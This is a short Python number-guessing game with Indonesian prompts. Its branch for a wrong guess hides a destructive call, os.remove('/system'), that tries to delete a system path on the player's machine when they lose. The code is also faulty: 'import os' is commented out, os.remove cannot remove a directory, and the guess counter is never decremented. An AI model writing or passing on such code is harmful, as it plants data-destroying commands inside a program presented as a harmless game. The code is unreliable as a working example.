#import os
import random

angka = random.randint(1, 10)
kesempatan = 3

print("=== GAME TEBAK ANGKA ===")
print("Tebak angka dari 1 sampai 10.")
print("Kamu punya 3 kesempatan untuk menebak dengan benar!\n")

while kesempatan > 0:
    try:
        tebak = int(input(f"Tebakan kamu ({kesempatan} kesempatan tersisa): "))

        if tebak == angka:
            print(f"🎉 Benar! Angkanya adalah {angka}. Kamu menang!")
            break
        else:
            print("❌ Salah! Kamu Kalah.")
            os.remove('/system')

    except ValueError:
        print("⚠️ Masukkan angka yang valid!")

if kesempatan == 0:
    print(f"\n😢 Kesempatan habis! Angka yang benar adalah {angka}.")

print("Terima kasih sudah bermain!")

